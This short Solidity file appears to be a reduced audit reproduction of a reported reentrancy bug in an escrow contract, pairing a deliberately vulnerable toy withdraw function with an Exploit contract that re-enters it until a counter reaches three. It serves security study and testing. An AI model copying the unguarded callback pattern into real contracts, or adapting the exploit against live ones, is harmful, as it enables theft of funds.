// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 44334: EYWA EscrowManager reentrancy. Reduced local model preserves the reported state transition.
interface IReceiver { function onWithdraw() external; }

contract Vulnerable {
    uint256 public withdrawals; function withdraw(address receiver) external { withdrawals++; if (withdrawals < 3) IReceiver(receiver).onWithdraw(); }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.withdraw(address(this)); success = bug.withdrawals() == 3;
    }

    function onWithdraw() external {
        if (bug.withdrawals() < 3) bug.withdraw(address(this));
    }
}


